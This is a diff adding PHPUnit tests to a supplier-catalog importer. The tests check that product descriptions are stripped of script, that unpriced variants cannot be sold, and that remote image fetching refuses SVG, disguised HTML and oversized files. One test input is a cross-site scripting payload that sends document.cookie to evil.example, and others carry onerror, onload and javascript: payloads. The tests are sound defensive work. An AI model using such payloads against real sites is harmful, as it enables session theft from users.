@@ -96,6 +96,17 @@ class M5aznImporterTest extends M5aznTestCase
         $this->assertSame('Tablets', $product->details);
     }
 
+    public function test_a_supplier_description_is_sanitised_before_it_is_stored_for_the_storefront(): void
+    {
+        $records = $this->catalogFixture();
+        $records[0]['description'] = '<p>Take <b>one</b> daily.</p><script>fetch("https://evil.example/?c="+document.cookie)</script><img src=x onerror=alert(1)><a href="javascript:alert(1)" onclick="x()">more</a>';
+        $this->stage($records);
+
+        $details = DB::table('products')->find($this->importer()->import($this->staged()->id)->productId)->details;
+
+        $this->assertSame('<p>Take <b>one</b> daily.</p><a>more</a>', $details);
+    }
+
     public function test_the_provider_link_is_an_approved_mapping_keyed_on_the_providers_own_id(): void
     {
         $this->stage();
@@ -357,6 +368,37 @@ class M5aznImporterTest extends M5aznTestCase
         $this->assertSame(['555', '555'], $mappings->pluck('external_id')->all());
     }
 
+    public function test_a_variant_without_a_price_is_imported_out_of_stock_so_it_cannot_be_sold_for_nothing(): void
+    {
+        $payload = $this->variantPayload([
+            ['sku' => 'TS-S', 'name' => 'Small', 'qty' => 4, 'price' => 30, 'cost' => 18],
+            ['sku' => 'TS-L', 'name' => 'Large', 'qty' => 6, 'cost' => 19],
+        ]);
+        $this->stage([$payload], $this->variantPaths());
+
+        $result = $this->importer()->import($this->staged('555')->id);
+
+        $product = DB::table('products')->find($result->productId);
+        $variation = json_decode($product->variation, true);
+        $this->assertSame([4, 0], array_column($variation, 'qty'), 'the unpriced size has no stock to buy');
+        $this->assertSame(4, (int) $product->current_stock);
+    }
+
+    public function test_stock_sync_never_makes_an_unpriced_variant_purchasable(): void
+    {
+        $payload = $this->variantPayload([
+            ['sku' => 'TS-S', 'name' => 'Small', 'qty' => 4, 'price' => 30, 'cost' => 18],
+            ['sku' => 'TS-L', 'name' => 'Large', 'qty' => 6, 'cost' => 19],
+        ]);
+        $this->stage([$payload], $this->variantPaths());
+        $productId = $this->importer()->import($this->staged('555')->id)->productId;
+
+        app(\App\Services\Fulfillment\InventorySyncService::class)->apply(ProviderCode::M5azn, ['555|TS-S' => 9, '555|TS-L' => 50]);
+
+        $variation = json_decode((string) DB::table('products')->where('id', $productId)->value('variation'), true);
+        $this->assertSame([9, 0], array_column($variation, 'qty'), 'the priced size follows the provider; the unpriced one stays at zero');
+    }
+
     public function test_a_variant_without_a_sku_is_sent_for_review_because_orders_need_the_exact_sku(): void
     {
         $payload = $this->variantPayload([['sku' => 'TS-S', 'name' => 'Small', 'qty' => 4, 'price' => 30], ['name' => 'Large', 'qty' => 6, 'price' => 32]]);
@@ -399,6 +441,40 @@ class M5aznImporterTest extends M5aznTestCase
         Http::fake(['https://1.1.1.1/*' => Http::response('<html>not an image</html>', 200, ['Content-Type' => 'text/html'])]);
 
         $this->assertNull((new RemoteImageFetcher())->fetch('https://1.1.1.1/a.png'));
+    }
+
+    public function test_an_svg_is_refused_even_when_it_claims_to_be_one_because_it_can_carry_script(): void
+    {
+        $svg = '<svg xmlns="http://www.w3.org/2000/svg" onload="alert(1)"><script>alert(1)</script></svg>';
+        Http::fake(['https://1.1.1.1/*' => Http::response($svg, 200, ['Content-Type' => 'image/svg+xml'])]);
+
+        $this->assertNull((new RemoteImageFetcher())->fetch('https://1.1.1.1/logo.svg'));
+    }
+
+    public function test_the_type_comes_from_the_bytes_not_from_what_the_response_claims(): void
+    {
+        $png = base64_decode('iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNkYPhfDwAChwGA60e6kgAAAABJRU5ErkJggg==');
+        Http::fake(['https://1.1.1.1/*' => Http::response($png, 200, ['Content-Type' => 'image/jpeg'])]);
+
+        $file = (new RemoteImageFetcher())->fetch('https://1.1.1.1/a.jpg');
+
+        $this->assertNotNull($file);
+        $this->assertSame('png', $file->getClientOriginalExtension(), 'a PNG is stored as a PNG whatever the header said');
+        $this->assertSame('image/png', $file->getClientMimeType());
+    }
+
+    public function test_html_dressed_up_as_an_image_is_refused(): void
+    {
+        Http::fake(['https://1.1.1.1/*' => Http::response('<script>alert(1)</script>', 200, ['Content-Type' => 'image/png'])]);
+
+        $this->assertNull((new RemoteImageFetcher())->fetch('https://1.1.1.1/a.png'));
+    }
+
+    public function test_an_image_larger_than_the_limit_is_refused(): void
+    {
+        Http::fake(['https://1.1.1.1/*' => Http::response(str_repeat('A', 5 * 1024 * 1024 + 1), 200, ['Content-Type' => 'image/png'])]);
+
+        $this->assertNull((new RemoteImageFetcher())->fetch('https://1.1.1.1/big.png'));
     }
 
     public function test_a_real_image_from_a_public_host_is_accepted(): void
